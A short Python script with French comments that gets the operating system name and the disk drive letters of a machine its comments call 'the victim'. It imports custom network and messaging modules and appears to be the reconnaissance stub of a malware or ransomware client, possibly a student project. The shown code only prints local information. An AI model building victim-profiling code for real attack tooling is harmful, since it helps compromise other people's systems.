import utile.network as network
import utile.message as message
import utile.config as config
import psutil
import platform


# Récupere le nom de l'OS de la victime
print(platform.system())

# Récupere le nom des disques disponibles de la victime
disques = []
for partition in psutil.disk_partitions():
    disques.append(partition.device[0:2])
print(disques)
